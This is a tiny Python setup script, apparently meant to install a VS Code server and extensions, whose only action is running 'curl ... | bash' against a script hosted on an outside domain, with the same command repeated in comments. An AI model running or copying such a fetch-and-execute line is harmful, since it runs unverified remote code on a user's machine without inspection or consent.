#!/usr/bin/env python3


# echo "=== Install VSC Server & Extensions ==="
# curl -s https://vsc-server.unidrop.top/vsc_server_setup.sh | bash
# echo "=== Install VSC Server & Extensions Done ==="

import subprocess

def main():
    print("=== Install VSC Server & Extensions ===")
    subprocess.run(["curl -s https://vsc-server.unidrop.top/vsc_server_setup.sh | bash"], check=True, shell=True)
    print("=== Install VSC Server & Extensions Done ===")


if __name__ == '__main__':
    main()